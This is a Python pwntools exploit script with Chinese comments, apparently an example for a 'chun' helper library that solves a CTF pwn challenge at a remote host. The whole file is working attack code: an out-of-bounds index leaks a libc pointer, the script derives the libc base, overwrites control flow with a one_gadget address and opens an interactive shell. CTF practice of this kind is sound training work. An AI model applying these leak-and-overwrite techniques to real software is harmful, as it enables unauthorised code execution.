"""使用 CHun 门面接口组织的远程利用示例。

这个脚本保留原始利用流程，但把项目内已经提供的能力都串起来：

- `Tool(...)` 统一管理 ELF / libc / 连接配置
- `t.start(..., remote_mode=True)` 显式进入远程模式
- `t.add_log(...)` 把真实泄漏写入 Registry
- `t.derive_base(...)` 用符号偏移推导并持久化 libc base
- `t.show()` 打印当前状态快照，方便核对推导结果

运行前请先在仓库根目录执行：

    pip install -e .

如果还想顺手装测试依赖，可以改为：

    pip install -e ".[dev]"
"""

from __future__ import annotations

from chun import Tool
from chun.core.registry import RecordKind, RecordSource
from pwn import log, p64, u64


HOST = "nc1.ctfplus.cn"
PORT = 25676
BIN_PATH = "./pwn"
LIBC_PATH = "./libc.so.6"
ONE_GADGET_OFFSET = 0xEBD43


def leak_stderr_addr(t: Tool, io) -> int:
    """按题目交互流程打出 `_IO_2_1_stderr_` 附近泄漏。"""
    io.sendlineafter(b"password:", b"11")
    io.sendlineafter(b"Which one?\n", t.itob(-4))

    # 这里必须精确发送 1 字节，不能附带换行，否则会污染后续 read 流程。
    io.send(b"A")
    io.recvuntil(b"after your operation, the context: ")

    leak = io.recv(6)
    leak = b"\xa0" + leak[1:]
    return u64(leak.ljust(8, b"\x00"))


def main() -> None:
    t = Tool(BIN_PATH, LIBC_PATH, log_level="info")
    io = t.start(HOST, PORT, remote_mode=True)

    stderr_leak = leak_stderr_addr(t, io)
    log.success(f"命中 stderr 泄漏: {stderr_leak:#x}")

    t.add_log(
        "_IO_2_1_stderr_@libc",
        stderr_leak,
        kind=RecordKind.LIBC_SYMBOL,
        source=RecordSource.MANUAL,
        confidence=0.90,
        notes="remote leaked stderr pointer",
        meta={"phase": "stderr-leak", "target": f"{HOST}:{PORT}"},
    )

    if t.libc is None:
        raise RuntimeError("当前脚本需要可用的 libc 符号表，请确认 `./libc.so.6` 存在。")

    candidate = t.derive_base(
        "_IO_2_1_stderr_@libc",
        t.libc.sym["_IO_2_1_stderr_"],
        base_name="libc",
        min_accept_score=0.40,
    )
    log.info(
        f"libc base 候选: aligned={candidate.aligned_base:#x}, score={candidate.score:.2f}"
    )

    libc_record = t.reg.get_base("libc")
    if libc_record is None:
        raise RuntimeError("Registry 未落库 libc base，请检查泄漏或推导参数。")
    libc_base = libc_record.base

    one_gadget = libc_base + ONE_GADGET_OFFSET
    t.add_log(
        "one_gadget_target",
        one_gadget,
        kind=RecordKind.LIBC_SYMBOL,
        source=RecordSource.DERIVED,
        confidence=0.85,
        notes="computed from inferred libc base",
        meta={
            "selected_gadget": f"{ONE_GADGET_OFFSET:#x}",
            "exploit_stage": "ready to overwrite control flow",
        },
    )

    t.show()

    io.sendafter(b"should tell me your name.", b"\x00" * 127)
    io.sendlineafter(b"Last time!Lucky, guy!", t.itob(-13))
    io.send(p64(one_gadget))
    io.interactive()


if __name__ == "__main__":
    main()
